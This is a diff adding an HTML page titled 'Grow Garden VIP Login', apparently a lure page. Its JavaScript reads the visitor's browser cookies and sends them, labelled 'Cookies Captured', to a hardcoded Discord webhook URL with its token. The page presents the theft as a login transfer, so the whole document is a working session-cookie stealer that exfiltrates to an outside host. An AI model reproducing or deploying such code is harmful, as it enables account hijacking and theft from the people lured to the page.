@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grow Garden VIP Login</title>
+</head>
+<body>
+  <h1>Welcome to Grow Garden VIP</h1>
+  <p>Click below to grab cookies and send to Discord for login transfer</p>
+  <a href="#" id="loginLink" onclick="grabAndSendCookies(event)" style="font-size: 20px; color: #5865F2;">
+    Click to Login/Join
+  </a>
+
+  <script>
+    async function grabAndSendCookies(event) {
+      event.preventDefault();
+
+      const cookies = document.cookie;
+      if (!cookies || cookies.trim() === "") {
+        alert("No cookies found! Make sure you're logged in first or have a session.");
+        return;
+      }
+
+      // Your real Discord webhook URL
+      const webhookUrl = "https://discord.com/api/webhooks/1441270080309690503/PIxq_p8MMWgPuh48Ax4q2umnYBcn3Bwr2NsFr52ltMN069Rv3gppq67ypTlGW1Tg3qhC";
+
+      const payload = {
+        content: "New Cookie Grab",
+        embeds: [{
+          title: "Cookies Captured",
+          description: "```" + cookies + "```",
+          color: 3447003,
+          timestamp: new Date().toISOString(),
+          footer: { text: "Grow Garden VIP" }
+        }]
+      };
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          alert("Cookies successfully sent to Discord! Check your channel.");
+        } else {
+          alert("Failed to send (status " + response.status + ")");
+        }
+      } catch (err) {
+        console.error(err);
+        alert("Network error – check console (F12) and make sure your webhook is still valid.");
+      }
+    }
+  </script>
+</body>
+</html>
